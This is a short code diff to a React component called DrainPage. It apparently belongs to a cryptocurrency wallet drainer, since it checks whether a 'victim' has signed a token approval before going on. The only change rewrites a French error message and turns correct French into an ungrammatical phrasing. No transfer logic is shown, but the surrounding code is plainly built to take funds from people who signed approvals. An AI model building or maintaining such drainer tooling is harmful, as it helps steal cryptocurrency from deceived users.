@@ -164,7 +164,7 @@ export default function DrainPage() {
         return;
       }
       if (allowance === 0n) {
-        setError("Aucune approbation — la victime n'a pas signé");
+        setError("Aucune approbation — la victime ne la pas signé");
         setLoading(false);
         return;
       }
